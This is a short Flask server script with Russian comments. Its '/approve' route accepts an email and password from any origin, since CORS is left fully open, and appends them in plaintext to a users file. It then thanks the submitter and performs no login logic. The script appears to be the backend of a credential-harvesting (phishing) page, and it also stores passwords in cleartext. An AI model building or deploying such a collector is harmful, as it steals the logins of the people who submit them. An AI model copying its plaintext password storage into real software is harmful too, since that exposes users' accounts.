from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import json
import os

app = Flask(__name__)
CORS(app)

# Создаём папку для базы
os.makedirs('database', exist_ok=True)

@app.route('/')
def index():
    return render_template('test.html')

@app.route('/approve', methods=['POST'])
def approve():
    data = request.get_json()  # получаем JSON
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({'error': 'Не все поля заполнены'}), 400

    with open('database/users.json', 'a') as f:
        f.write(f'{email}:{password}\n')

    print(f"✅ Запрос получен: {email}")
    return jsonify({'status': 'ok', 'message': 'Спасибо!'})